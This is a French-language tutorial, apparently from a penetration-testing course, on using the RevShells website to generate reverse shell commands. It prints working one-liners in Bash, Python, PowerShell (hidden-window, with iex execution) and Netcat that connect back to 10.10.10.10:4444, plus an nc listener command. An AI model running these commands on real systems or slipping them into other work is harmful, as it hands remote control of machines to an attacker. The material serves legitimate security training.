# Shells et Reverse Shells

### **Tuto RevShells : Générateur de Reverse Shells en ligne**

RevShells est un outil en ligne qui aide à générer des commandes de reverse shells adaptées à différents environnements et langages. Il est particulièrement utile pour les tests de pénétration ou les exercices de cybersécurité.

***

### **Fonctionnalités principales :**

* Génération rapide de commandes de reverse shells compatibles avec divers langages (Bash, Python, PHP, PowerShell, etc.).
* Paramétrage simple avec l'adresse IP et le port cible.
* Options pour des shells spécifiques comme Netcat, Socat, Perl, Ruby, ou encore Java.
* Affichage des configurations nécessaires sur la machine d'écoute.

***

### **Comment utiliser RevShells :**

1. **Accéder au site :**
   * Rendez-vous sur [RevShells](https://www.revshells.com/).
2. **Configurer les paramètres :**
   * **IP** : Entrez l'adresse IP de votre machine attaquante (celle où le shell se connectera).
   * **Port** : Indiquez le port que votre machine écoutera pour la connexion entrante.
3. **Choisir le type de shell :**
   * RevShells propose une liste complète de reverse shells parmi les plus courants :
     * **Bash** : Pour les environnements Linux/Unix.
     * **Netcat** : Une solution rapide si Netcat est disponible.
     * **Python/Perl/Ruby** : Pour les systèmes ayant ces interpréteurs.
     * **PHP** : Utile pour les serveurs web.
     * **PowerShell** : Pour les systèmes Windows.
     * **Socat** : Pour un reverse shell plus robuste.
     * **Java** : Pour des environnements basés sur Java.
   * Cliquez sur le shell souhaité pour générer la commande correspondante.
4. **Copier la commande générée :**
   * La commande adaptée à votre configuration est affichée. Vous pouvez la copier pour l'utiliser sur la machine cible.
5. **Configurer l'écouteur sur votre machine :**
   * RevShells fournit également la commande à exécuter sur votre machine pour écouter les connexions entrantes.
   *   Exemple avec Netcat :

       ```bash
       nc -lvnp [PORT]
       ```
   * Lancez cette commande avant d'exécuter le shell généré sur la machine cible.

***

### **Exemples de commandes générées :**

**1. Bash Reverse Shell :**

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

**2. Python Reverse Shell :**

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**3. PowerShell Reverse Shell :**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()
```

**4. Netcat Reverse Shell :**

```bash
nc -e /bin/bash 10.10.10.10 4444
```

***

### **Bonnes pratiques :**

* **Test en environnement contrôlé** : Utilisez toujours les reverse shells dans un environnement d'apprentissage ou autorisé.
* **Configurer le pare-feu local** : Assurez-vous que le port spécifié est ouvert sur votre machine attaquante.
* **Évitez les abus** : RevShells est conçu pour des tests éthiques et éducatifs uniquement.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
